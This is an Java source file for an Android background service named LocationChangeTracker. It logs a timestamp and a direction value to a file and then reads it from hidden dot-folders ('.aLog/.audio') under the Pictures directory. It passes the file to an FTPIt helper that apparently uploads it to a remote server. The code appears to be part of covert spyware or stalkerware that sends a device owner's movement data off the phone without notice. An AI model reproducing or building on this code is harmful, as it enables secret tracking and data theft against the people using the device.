package stupuid.maga.legacy;

import android.app.Service;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;
import java.io.File;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class LocationChangeTracker extends Service {
    Intent I;

    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    public int onStartCommand(Intent intent, int a, int b) {
        Log.i("started", "started");
        Map aHashMap = new HashMap();
        Calendar cal = Calendar.getInstance(Locale.getDefault());
        HashMap aMap = new HashMap();
        ArrayList aList = new ArrayList();
        aMap.put("changed", cal.toString());
        aMap.put("direction", intent.getExtras().get("direction").toString());
        aList.add(aMap);
        BetterPrinter.maketheFile(aList, "loc.txt");
        File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), ".aLog/.audio/loc.txt");
        BetterPrinter.FTPIt(file.getPath(), file.getName(), getApplicationContext());
        stopSelf();
        return 2;
    }
}
